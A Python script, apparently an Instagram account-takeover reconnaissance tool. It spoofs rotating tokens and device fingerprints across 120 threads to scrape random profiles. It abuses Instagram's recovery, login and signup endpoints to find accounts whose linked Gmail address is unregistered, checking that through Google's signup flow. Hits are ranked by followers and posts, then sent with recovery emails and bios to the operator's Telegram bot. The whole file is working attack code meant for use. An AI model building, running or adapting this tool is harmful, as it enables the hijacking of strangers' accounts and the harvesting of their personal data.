import os
import sys
import json
import random
import time
import threading
import requests
import hashlib
import uuid
import re
import string
import sqlite3
from user_agent import generate_user_agent as generate_user_agent_random
from datetime import datetime
from secrets import token_hex

try:
    import pycountry
except:
    pycountry = None

class ZCode:
    def __init__(self):
        self.display_startup()
        self.gather_credentials()
        self.initialize_state()
        self.setup_instagram_id_ranges()
        self.setup_database()
        self.gather_user_configuration()
        self.setup_error_handlers()
        self.initialize_token_pools()
        self.initialize_functions()
        self.spawn_worker_threads()

    def display_startup(self):
        print("-   Z CODE - ENUMERATION TOOL")
        print("")

    def gather_credentials(self):
        self.telegram_token = input('-   Enter Telegram Bot Token: ')
        self.telegram_chat_id = input('-   Enter Telegram Chat ID: ')

    def initialize_state(self):
        self.successful_enumerations = 0
        self.available_gmail_addresses = 0
        self.instagram_accounts_without_email = 0
        self.taken_gmail_usernames = 0
        self.instagram_email_associations = 0
        self.account_profile_cache = {}
        self.character_set = 'azertyuiopmlkjhgfdsqwxcvbn'
        self.thread_synchronization_lock = threading.Lock()
        self.success_rate_percentage = 0.0
        self.rate_limit_detected = False

    def setup_instagram_id_ranges(self):
        self.instagram_user_id_ranges = {
            1: (1279001, 17750000),
            2: (17750000, 279760000),
            3: (279760000, 900990000),
            4: (900990000, 1629010000),
            5: (1629010000, 2500000000),
            6: (2500000000, 3713668786),
            7: (3713668786, 5699785217),
            8: (5699785217, 8507940634),
            9: (8507940634, 21254029834)
        }

    def setup_database(self):
        try:
            self.database_connection = sqlite3.connect('zcode_data.db', check_same_thread=False)
            self.database_cursor = self.database_connection.cursor()
            self.database_cursor.execute('''CREATE TABLE IF NOT EXISTS enumerated_accounts
                (id INTEGER PRIMARY KEY, username TEXT, email TEXT, followers INTEGER, posts INTEGER, rest_data TEXT, timestamp TEXT)''')
            self.database_connection.commit()
        except Exception as error:
            pass

    def gather_user_configuration(self):
        print('\nSelect Instagram account creation year:')
        for year_index in range(1, 10):
            print(f"{year_index} - {2010 + year_index}")

        def get_safe_integer_input(prompt_text, default_value):
            try:
                user_input = input(prompt_text).strip()
                return int(user_input) if user_input else default_value
            except:
                return default_value

        self.selected_year_range = get_safe_integer_input('Select year (1-9): ', 5)
        self.minimum_follower_threshold = get_safe_integer_input('Minimum followers needed: ', 0)
        self.minimum_post_threshold = get_safe_integer_input('Minimum posts needed: ', 0)

    def setup_error_handlers(self):
        self.error_handler_mapping = {
            'rate_limit': self.handle_rate_limit_error,
            'validation_error': self.handle_validation_error_exception
        }

    def handle_rate_limit_error(self):
        self.rate_limit_detected = True
        time.sleep(random.randint(30, 60))
        self.rate_limit_detected = False

    def handle_validation_error_exception(self):
        time.sleep(random.randint(5, 15))

    def initialize_token_pools(self):
        self.mid_tokens = [
            'ZVfGvgABAAGoQqa7AY3mgoYBV1nP',
            'ZrQhnAABAAGBdscjjB-Fb3_pcDhQ',
            'Y16iBgABAAFggfUYwajggkGFz-hs',
            'Zo8bBAAEAAF27Fed1oBbtK7tGgwj',
            'Zt4loQABAAFzGR1YLL2M9XOkL9El',
            'Z9kT-AALAAFmBDeLH2Lk_XrIJfr3'
        ]

        self.csrf_tokens = [
            '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
            'g8gnoPZQPjPnN6ozxUZ26LcRG2RQc9v1',
            'Gs5qTLrfajMdt0_4klliKd',
            'Xs_pgEDyRPW7J-XbcRxAuG'
        ]

        self.bloks_versions = [
            'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0',
            '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
            '8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb'
        ]

        self.device_ids = [
            'android-b93ddb37e983481c',
            'android-2793e055-2a92-4df2-890f-f88f52538de5',
            'android-bf1b282ab2b0b445'
        ]

        self.ig_did_list = [
            'E50FABB9-2431-45C2-A804-50BB922F7C97',
            '1DE3A5D0-A9E6-41AE-A389-ED36F72A90CF',
            '273FE2EC-B117-427D-AA63-55AAA5079643'
        ]

        self.datr_cookies = [
            'B5_XZ1qXyHIoAhibTD6smK7K',
            'nCG0Zucex87H44J0VQJbhvIe'
        ]

        self.pigeon_session_pool = [
            'UFS-42175dfd-8675-4443-8f8d-7f09fa7ea9da-0',
            'UFS-50cc6861-7036-43b4-802e-fb4282799999-1'
        ]

        self.brand_pool = ['SAMSUNG', 'HUAWEI', 'LGE/lge', 'HTC', 'ASUS', 'ZTE', 'ONEPLUS', 'XIAOMI', 'OPPO', 'VIVO', 'SONY', 'REALME']

    def select_mid(self):
        return random.choice(self.mid_tokens)

    def select_csrf(self):
        return random.choice(self.csrf_tokens)

    def select_bloks(self):
        return random.choice(self.bloks_versions)

    def select_device_id(self):
        return random.choice(self.device_ids)

    def select_ig_did(self):
        return random.choice(self.ig_did_list)

    def select_datr(self):
        return random.choice(self.datr_cookies)

    def select_pigeon_session(self):
        return random.choice(self.pigeon_session_pool)

    class RequestVariables:
        def __init__(self, parent):
            self.parent = parent
            try:
                if pycountry:
                    self.country_codes = [c.numeric for c in pycountry.countries]
                    self.selected_country = random.choice(self.country_codes)
                else:
                    self.selected_country = str(random.randint(1, 999)).zfill(3)
            except:
                self.selected_country = str(random.randint(1, 999)).zfill(3)

            self.signed_body_hash = random.choice([
                hashlib.sha256(uuid.uuid4().hex.encode()).hexdigest(),
                '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f'
            ])
            self.csrf_token = parent.select_csrf()
            self.device_id_android = parent.select_device_id()

    def check_email_method_1(self, email):
        try:
            csrf = self.select_csrf()
            mid = self.select_mid()
            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/accounts/signup/email/',
                'user-agent': generate_user_agent_random(),
                'x-csrftoken': csrf,
                'x-mid': mid,
                'cookie': f'mid={mid}; csrftoken={csrf}'
            }
            response = requests.post('https://www.instagram.com/api/v1/web/accounts/check_email/', headers=headers, data={'email': email}, timeout=10)
            if 'email_is_taken' in str(response.text):
                return True
        except:
            pass
        return False

    def check_email_method_2(self, email):
        try:
            csrf = self.select_csrf()
            device_id = self.select_device_id()
            mid = self.select_mid()
            uui = str(uuid.uuid4())
            headers = {
                'User-Agent': generate_user_agent_random(),
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Mid': mid,
                'X-CSRFToken': csrf
            }
            cookies = {'csrftoken': csrf, 'mid': mid}
            data = {
                'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' + json.dumps({
                    '_csrftoken': csrf, 'adid': uui, 'guid': uui, 'device_id': device_id, 'query': email
                }),
                'ig_sig_key_version': '4'
            }
            response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, cookies=cookies, data=data, timeout=10).text
            if email in response:
                return True
        except:
            pass
        return False

    def check_email_method_3(self, email):
        try:
            mid = self.select_mid()
            csrf = self.select_csrf()
            device_id = self.select_device_id()
            headers = {
                'Host': 'i.instagram.com',
                'cookie': f"mid={mid}; csrftoken={csrf}",
                'x-ig-capabilities': 'AQ==',
                'cookie2': '$Version=1',
                'x-ig-connection-type': 'WIFI',
                'user-agent': 'Instagram 136.0.0.34.124 Android',
                'x-mid': mid,
                'x-csrftoken': csrf
            }
            data = {
                'password': 'Topython',
                'device_id': device_id,
                'guid': str(uuid.uuid4()),
                'email': email,
                'username': 'topython8786969_586'
            }
            response = requests.post('https://i.instagram.com/api/v1/accounts/create/', headers=headers, data=data, timeout=10)
            if 'Another account is using the same email' in response.text:
                return True
        except:
            pass
        return False

    def check_email_method_4(self, email):
        try:
            csrf = self.select_csrf()
            mid = self.select_mid()
            ig_did = self.select_ig_did()

            data = {
                'enc_password': '#PWD_INSTAGRAM_BROWSER:0:' + str(int(time.time())) + ':maybe-jay-z',
                'optIntoOneTap': 'false',
                'queryParams': '{}',
                'trustedDeviceRecords': '{}',
                'username': email
            }

            app = ''.join(random.choice('1234567890') for _ in range(15))

            headers = {
                'User-Agent': generate_user_agent_random(),
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'x-csrftoken': csrf,
                'x-ig-app-id': app,
                'x-mid': mid,
                'Cookie': f"csrftoken={csrf}; mid={mid}; ig_did={ig_did};"
            }

            response2 = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', headers=headers, data=data, timeout=10)
            if 'showAccountRecoveryModal' in response2.text:
                return True
        except:
            pass
        return False

    def check_email_method_5(self, email):
        try:
            mid = self.select_mid()
            csrf = self.select_csrf()
            device_id = self.select_device_id()
            pigeon_session = self.select_pigeon_session()
            bloks_version = self.select_bloks()

            payload = f"params=%7B%22client_input_params%22%3A%7B%22search_query%22%3A%22{email}%22%7D%7D"
            headers = {
                'User-Agent': generate_user_agent_random(),
                'x-ig-app-locale': 'en-US',
                'x-ig-device-locale': 'en-US',
                'x-ig-mapped-locale': 'en-US',
                'x-pigeon-session-id': pigeon_session,
                'x-pigeon-rawclienttime': str('{:.3f}'.format(time.time())),
                'x-ig-bandwidth-speed-kbps': '-1.000',
                'x-ig-bandwidth-totalbytes-b': '0',
                'x-ig-bandwidth-totaltime-ms': '0',
                'x-bloks-version-id': bloks_version,
                'x-ig-www-claim': '0',
                'x-bloks-is-layout-rtl': 'true',
                'x-ig-device-id': device_id,
                'x-ig-family-device-id': str(uuid.uuid4()),
                'x-ig-android-id': device_id,
                'x-ig-timezone-offset': '10800',
                'x-fb-connection-type': 'MOBILE.LTE',
                'x-ig-connection-type': 'MOBILE(LTE)',
                'x-ig-capabilities': '3brTv10=',
                'x-ig-app-id': '567067343352427',
                'priority': 'u=3',
                'accept-language': 'en-US',
                'x-mid': mid,
                'ig-intended-user-id': '0',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': f'mid={mid}; csrftoken={csrf}'
            }
            response = requests.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.caa.ar.search.async/', data=payload, headers=headers, timeout=10)
            if response.status_code == 200 and 'The password you entered is incorrect.' in str(response.json()):
                return True
        except:
            pass
        return False

    def check_email_method_6(self, email):
        try:
            var = self.RequestVariables(self)
            mid = self.select_mid()
            pigeon_session = self.select_pigeon_session()
            bloks_version = self.select_bloks()

            payload = f"signed_body={var.signed_body_hash}.%7B%22country_codes%22%3A%22%5B%7B%5C%22country_code%5C%22%3A%5C%22{var.selected_country}%5C%22%2C%5C%22source%5C%22%3A%5B%5C%22default%5C%22%5D%7D%5D%22%2C%22_csrftoken%22%3A%22{var.csrf_token}%22%2C%22q%22%3A%22{email}%22%2C%22guid%22%3A%22{uuid.uuid4()}%22%2C%22device_id%22%3A%22{var.device_id_android}%22%2C%22directly_sign_in%22%3A%22true%22%7D&ig_sig_key_version=4"
            headers = {
                'User-Agent': generate_user_agent_random(),
                'Accept-Encoding': 'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Pigeon-Session-Id': pigeon_session,
                'X-Pigeon-Rawclienttime': str('{:.3f}'.format(time.time())),
                'X-IG-Connection-Speed': '-1kbps',
                'X-IG-Bandwidth-Speed-KBPS': '-1.000',
                'X-IG-Bandwidth-TotalBytes-B': '0',
                'X-IG-Bandwidth-TotalTime-MS': '0',
                'X-Bloks-Version-Id': bloks_version,
                'X-IG-Connection-Type': 'MOBILE(LTE)',
                'X-IG-Capabilities': '3brTvw==',
                'X-IG-App-ID': '567067343352427',
                'Accept-Language': 'ar-YE, en-US',
                'X-FB-HTTP-Engine': 'Liger',
                'X-Mid': mid,
                'Cookie': f'mid={mid}; csrftoken={var.csrf_token}'
            }
            res = requests.post('https://i.instagram.com/api/v1/users/lookup/', data=payload, headers=headers, timeout=10).text
            if '"status":"ok"' in res and f"{email}" in res:
                return True
        except:
            pass
        return False

    def email_verification_check(self, email):
        method = random.choice([1, 2, 3, 4, 5, 6])
        methods = {1: self.check_email_method_1, 2: self.check_email_method_2, 3: self.check_email_method_3,
                   4: self.check_email_method_4, 5: self.check_email_method_5, 6: self.check_email_method_6}
        return methods[method](email)

    def rest(self, instagram_username, email_address):
        try:
            mid_token = self.select_mid()
            csrf_token = self.select_csrf()
            device_token = self.select_device_id()
            pigeon_session = self.select_pigeon_session()

            headers = {
                'X-Pigeon-Session-Id': pigeon_session,
                'User-Agent': generate_user_agent_random(),
                'X-Mid': mid_token,
                'X-CSRF-Token': csrf_token,
                'X-Device-ID': device_token,
                'X-Pigeon-Rawclienttime': str('{:.3f}'.format(time.time())),
                'Cookie': f'mid={mid_token}; csrftoken={csrf_token}'
            }

            response = requests.get(
                f'https://www.instagram.com/api/v1/users/web_profile_info/?username={instagram_username}',
                headers=headers,
                timeout=10
            )

            status_code = response.status_code
            response_length = len(response.text)

            rest_data = (
                f"instagram_status={status_code};"
                f"response_length={response_length};"
                f"mid={mid_token[:16]}...;"
                f"csrf={csrf_token[:12]}...;"
                f"device={device_token[:16]}...;"
                f"session={pigeon_session[:20]}...;"
                f"timestamp={int(time.time())}"
            )

            return rest_data
        except Exception as e:
            return f"err={str(e)[:40]};timestamp={int(time.time())}"

    def fetch_google_authentication_tokens(self):
        try:
            random_string_one = ''.join(random.choice(self.character_set) for _ in range(random.randint(6, 9)))
            random_string_two = ''.join(random.choice(self.character_set) for _ in range(random.randint(3, 9)))
            random_host_cookie = ''.join(random.choice(self.character_set) for _ in range(random.randint(15, 30)))

            request_headers = {
                'accept': '*/*',
                'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'google-accounts-xsrf': '1',
                'user-agent': str(generate_user_agent_random())
            }

            initial_response = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', headers=request_headers, timeout=15)
            extracted_token = re.search('data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', initial_response.text).group(2)

            request_cookies = {'__Host-GAPS': random_host_cookie}
            request_headers['origin'] = 'https://accounts.google.com'
            request_headers['referer'] = 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn'
            request_headers['authority'] = 'https://accounts.google.com'

            request_payload = {
                'f.req': f'["{extracted_token}","{random_string_one}","{random_string_two}","{random_string_one}","{random_string_two}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
                'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'
            }

            validation_response = requests.post('https://accounts.google.com/_/signup/validatepersonaldetails', cookies=request_cookies, headers=request_headers, data=request_payload, timeout=15)
            self.google_auth_token = str(validation_response.text).split('",null,"')[1].split('"')[0]
            self.google_gaps_cookie = validation_response.cookies.get_dict()['__Host-GAPS']

            with open('tl.txt', 'w') as token_file:
                token_file.write(f"{self.google_auth_token}//{self.google_gaps_cookie}\n")
        except Exception as error:
            self.fetch_google_authentication_tokens()

    def check_gmail_username_availability(self, email_username):
        try:
            if '@' in email_username:
                email_username = email_username.split('@')[0]

            try:
                with open('tl.txt', 'r') as token_file:
                    token_file_content = token_file.read().splitlines()[0]
                google_token, google_cookie = token_file_content.split('//')
            except:
                return

            request_cookies = {'__Host-GAPS': google_cookie}
            request_headers = {
                'authority': 'accounts.google.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'google-accounts-xsrf': '1',
                'origin': 'https://accounts.google.com',
                'referer': f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={google_token}",
                'user-agent': generate_user_agent_random()
            }

            request_parameters = {'TL': google_token}
            request_payload = f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A{google_token}%22%2C%22{email_username}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&"

            availability_response = requests.post('https://accounts.google.com/_/signup/usernameavailability', params=request_parameters, cookies=request_cookies, headers=request_headers, data=request_payload, timeout=10)

            if '"gf.uar",1' in str(availability_response.text):
                with self.thread_synchronization_lock:
                    self.available_gmail_addresses += 1
                    self.display_current_progress()
                if '@' not in email_username:
                    self.process_enumerated_account(email_username, email_username)
            else:
                with self.thread_synchronization_lock:
                    self.taken_gmail_usernames += 1
                    self.display_current_progress()
        except Exception as error:
            pass

    def verify_instagram_email_association(self, email_address):
        try:
            user_agent_string = generate_user_agent_random()
            android_device_id = self.select_device_id()
            universal_guid = str(uuid.uuid4())
            dynamic_mid = self.select_mid()
            dynamic_csrftoken = self.select_csrf()

            request_headers = {
                'User-Agent': user_agent_string,
                'Cookie': f'mid={dynamic_mid}; csrftoken={dynamic_csrftoken}',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Mid': dynamic_mid,
                'X-CSRFToken': dynamic_csrftoken
            }

            request_payload = {
                'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' + json.dumps({
                    '_csrftoken': dynamic_csrftoken,
                    'adid': universal_guid,
                    'guid': universal_guid,
                    'device_id': android_device_id,
                    'query': email_address
                }),
                'ig_sig_key_version': '4'
            }

            instagram_response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=request_headers, data=request_payload, timeout=10).text

            if email_address in instagram_response:
                if '@gmail.com' in email_address:
                    self.check_gmail_username_availability(email_address)
                with self.thread_synchronization_lock:
                    self.instagram_email_associations += 1
                    self.display_current_progress()
            else:
                with self.thread_synchronization_lock:
                    self.instagram_accounts_without_email += 1
                    self.display_current_progress()
        except Exception as error:
            pass

    def get_instagram_recovery_email(self, instagram_username):
        try:
            dynamic_mid = self.select_mid()
            dynamic_csrftoken = self.select_csrf()
            device_id = self.select_device_id()
            pigeon_session = self.select_pigeon_session()
            bloks_version = self.select_bloks()

            request_headers = {
                'X-Pigeon-Session-Id': pigeon_session,
                'X-Pigeon-Rawclienttime': str(int(time.time() * 1000)),
                'X-IG-Connection-Speed': '-1kbps',
                'X-IG-Bandwidth-Speed-KBPS': '-1.000',
                'X-IG-Bandwidth-TotalBytes-B': '0',
                'X-IG-Bandwidth-TotalTime-MS': '0',
                'X-Bloks-Version-Id': bloks_version,
                'X-IG-Connection-Type': 'WIFI',
                'X-IG-Capabilities': '3brTvw==',
                'X-IG-App-ID': '567067343352427',
                'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
                'Accept-Language': 'en-GB, en-US',
                'Cookie': f'mid={dynamic_mid}; csrftoken={dynamic_csrftoken}',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Mid': dynamic_mid,
                'X-CSRFToken': dynamic_csrftoken
            }

            request_payload = {
                'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' + json.dumps({
                    "_csrftoken": dynamic_csrftoken,
                    "adid": str(uuid.uuid4()),
                    "guid": str(uuid.uuid4()),
                    "device_id": device_id,
                    "query": instagram_username
                }),
                'ig_sig_key_version': '4'
            }

            recovery_response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=request_headers, data=request_payload, timeout=10).json()
            recovery_email = recovery_response.get('email', 'not_associated')
            return recovery_email if recovery_email else 'not_associated'
        except Exception as error:
            return 'error'

    def estimate_instagram_account_creation_year(self, instagram_user_id):
        try:
            numeric_user_id = int(instagram_user_id)
            year_estimation_map = [
                (1, 1279000, 2010),
                (1279001, 17750000, 2011),
                (17750001, 279760000, 2012),
                (279760001, 900990000, 2013),
                (900990001, 1629010000, 2014),
                (1900000000, 2500000000, 2015),
                (2500000000, 3713668786, 2016),
                (3713668786, 5699785217, 2017),
                (5699785217, 8507940634, 2018),
                (8507940634, 21254029834, 2019)
            ]
            for range_minimum, range_maximum, estimated_year in year_estimation_map:
                if range_minimum < numeric_user_id < range_maximum:
                    return estimated_year
            return '2020-2023'
        except:
            return ''

    def save_enumerated_account_to_database(self, instagram_username, email_address, follower_count, post_count, rest_data):
        try:
            current_timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            self.database_cursor.execute('INSERT INTO enumerated_accounts (username, email, followers, posts, rest_data, timestamp) VALUES (?, ?, ?, ?, ?, ?)',
                                 (instagram_username, email_address, follower_count, post_count, rest_data, current_timestamp))
            self.database_connection.commit()
        except Exception as error:
            pass

    def process_enumerated_account(self, instagram_username, domain_part):
        with self.thread_synchronization_lock:
            self.successful_enumerations += 1

        profile_data = self.account_profile_cache.get(instagram_username, {})

        instagram_user_id = profile_data.get('pk', None)
        account_full_name = profile_data.get('full_name', None)
        account_follower_count = profile_data.get('follower_count', None)
        account_post_count = profile_data.get('media_count', None)
        account_biography = profile_data.get('biography', None)

        is_quality_account = True if (account_follower_count and account_post_count and int(account_follower_count) >= 10 and int(account_post_count) >= 2) else False
        recovery_email_result = self.get_instagram_recovery_email(instagram_username)

        associated_email = f"{instagram_username}@gmail.com"

        rest_data = self.rest(instagram_username, associated_email)

        enumeration_message = f"DATA::{instagram_username}::EMAIL::{associated_email}::REST::{recovery_email_result}::{account_follower_count}::{account_post_count}::{account_full_name}::{account_biography}::{instagram_user_id}::{self.estimate_instagram_account_creation_year(instagram_user_id)}::{is_quality_account}::https://www.instagram.com/{instagram_username}::{rest_data}"

        telegram_inline_buttons = [[{'text': 'Dev', 'url': 'https://t.me/nexerpy'}, {'text': 'Channel', 'url': 'https://t.me/portalpy'}]]
        telegram_message_payload = {'chat_id': self.telegram_chat_id, 'text': enumeration_message, 'reply_markup': json.dumps({'inline_keyboard': telegram_inline_buttons})}

        try:
            requests.post(f"https://api.telegram.org/bot{self.telegram_token}/sendMessage", data=telegram_message_payload, timeout=10)
            self.save_enumerated_account_to_database(instagram_username, associated_email, account_follower_count, account_post_count, rest_data)
        except Exception as error:
            pass

    def display_current_progress(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print("="*60)
        print(f"Available Gmail: [{self.available_gmail_addresses}] | Without Email: [{self.instagram_accounts_without_email}] | Taken: [{self.taken_gmail_usernames}]")
        print(f"Successful: [{self.successful_enumerations}] | IG-Email: [{self.instagram_email_associations}]")
        print("="*60)

    def optimize_memory_cache(self):
        if len(self.account_profile_cache) > 5000:
            with self.thread_synchronization_lock:
                oldest_cache_key = next(iter(self.account_profile_cache))
                del self.account_profile_cache[oldest_cache_key]

    def calculate_operation_success_rate(self):
        total_operation_attempts = self.available_gmail_addresses + self.taken_gmail_usernames + self.instagram_accounts_without_email
        if total_operation_attempts > 0:
            self.success_rate_percentage = (self.available_gmail_addresses / total_operation_attempts) * 100
        return self.success_rate_percentage

    def enumeration_worker_loop(self):
        while True:
            try:
                if self.rate_limit_detected:
                    time.sleep(random.randint(5, 15))
                    continue

                range_minimum, range_maximum = self.instagram_user_id_ranges.get(self.selected_year_range, self.instagram_user_id_ranges[5])
                generated_user_id = str(random.randrange(range_minimum, range_maximum))

                mid = self.select_mid()
                csrf = self.select_csrf()
                device_id = self.select_device_id()

                device_model_number = str(random.randint(150, 999))
                android_version_info = random.choice(['23/6.0', '24/7.0', '25/7.1.1', '26/8.0', '27/8.1', '28/9.0'])
                screen_density_pixels = str(random.randint(100, 1300))
                screen_resolution_dimensions = f"{random.randint(200, 2000)}x{random.randint(200, 2000)}"
                device_brand_name = random.choice(self.brand_pool)
                build_number_suffix = str(random.randint(111, 999))

                user_agent_header_value = f"Instagram 311.0.0.32.118 Android ({android_version_info}; {screen_density_pixels}dpi; {screen_resolution_dimensions}; {device_brand_name}; SM-T{device_model_number}; SM-T{device_model_number}; qcom; en_US; 545986{build_number_suffix})"
                least_significant_data_identifier = ''.join(random.choices(string.ascii_letters + string.digits, k=32))

                graphql_request_headers = {
                    'accept': '*/*',
                    'accept-language': 'en,en-US;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded',
                    'dnt': '1',
                    'origin': 'https://www.instagram.com',
                    'priority': 'u=1, i',
                    'referer': 'https://www.instagram.com/cristiano/following/',
                    'user-agent': user_agent_header_value,
                    'x-fb-friendly-name': 'PolarisUserHoverCardContentV2Query',
                    'x-fb-lsd': least_significant_data_identifier,
                    'x-csrftoken': csrf,
                    'x-mid': mid,
                    'cookie': f'mid={mid}; csrftoken={csrf}'
                }

                graphql_request_payload = {
                    'lsd': least_significant_data_identifier,
                    'fb_api_caller_class': 'RelayModern',
                    'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
                    'variables': json.dumps({'userID': generated_user_id, 'username': 'cristiano'}),
                    'server_timestamps': 'true',
                    'doc_id': '7717269488336001'
                }

                instagram_graphql_response = requests.post('https://www.instagram.com/api/graphql', headers=graphql_request_headers, data=graphql_request_payload, timeout=10)
                extracted_user_profile_data = instagram_graphql_response.json().get('data', {}).get('user', {})
                extracted_username = extracted_user_profile_data.get('username', '')

                with self.thread_synchronization_lock:
                    self.account_profile_cache[extracted_username] = extracted_user_profile_data
                    self.optimize_memory_cache()

                extracted_follower_count = int(extracted_user_profile_data.get('follower_count', 0))
                extracted_media_post_count = int(extracted_user_profile_data.get('media_count', 0))

                if extracted_username and '_' not in extracted_username and extracted_follower_count >= self.minimum_follower_threshold and extracted_media_post_count >= self.minimum_post_threshold:
                    generated_email_candidate = f"{extracted_username}@gmail.com"
                    self.verify_instagram_email_association(generated_email_candidate)

                self.calculate_operation_success_rate()

            except Exception as error:
                pass

    def initialize_functions(self):
        self.fetch_google_authentication_tokens()

    def spawn_worker_threads(self):
        for worker_thread_index in range(120):
            worker_thread = threading.Thread(target=self.enumeration_worker_loop, daemon=True, name=f"Worker-{worker_thread_index}")
            worker_thread.start()

        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            if self.database_connection:
                self.database_connection.close()
            import sys
            sys.exit(0)

if __name__ == '__main__':
    ZCode()
